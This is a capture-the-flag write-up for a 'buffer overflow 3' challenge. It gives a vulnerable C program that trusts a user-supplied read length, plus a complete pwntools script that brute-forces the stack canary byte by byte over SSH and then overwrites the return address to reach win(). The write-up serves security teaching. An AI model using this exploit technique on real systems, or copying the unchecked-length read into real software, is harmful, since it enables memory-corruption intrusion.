buffer overflow 3 - Points: 450
===========

## Description

>It looks like Dr. Xernon added a stack canary to this program to protect against buffer overflows. Do you think you can bypass the protection and get the flag?

## Hint:

> * Maybe there's a smart way to brute-force the canary?

## Vulnerable Code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

## Useful Information

```
$nm canary_bypass|grep win
080486eb T win
```

## Exploit

**REQUIRE** :[Pwntools Python](https://github.com/Gallopsled/pwntools)

> 1. Overflowing the canary letter after letter and check error message.
> 2. Overflowing EIP with Win() Address

```python
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
from pwn import *
import re

#To Complete
user=""
password=""
host=""

path_exec="/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f"
Name_prog="canary_bypass"
sh = ssh(host=host,user=user,password=password).run("sh")#process(path_exec+"/vuln",cwd=path_exec)
sh.sendline("cd "+path_exec)

pay2=32*"A"
pay1=str(len(pay2))
canary=""

win=p32(0x80486eb)
sh.recv(4096)
sh.recv(4096)
for a in range(4):
    print("TEST LETTER %d" % a)
    for b in range(1,256):
        print("TEST SUB-LETTER %c" % b)
        sh.sendline("./vuln")
        print("How many = "+sh.recv())
        sh.sendline(str(len(pay2+canary)+1))
        print("Input = "+sh.recv())
        sh.sendline(pay2+canary+(chr(b)))
        output=sh.recv()
        print("OUTPUT = "+output)

        if not re.search("Corrupt",output):
            print("FOUND %d" % b)
            canary+=chr(b)
            break
print("CANARY = "+canary)
payload=pay2+canary+"A"*16+win
sh.sendline("./vuln")
sh.recv()
sh.sendline(str(len(payload)))
sh.recv()
sh.sendline(payload)
print("FLAG "+sh.recv())
sh.close()
```
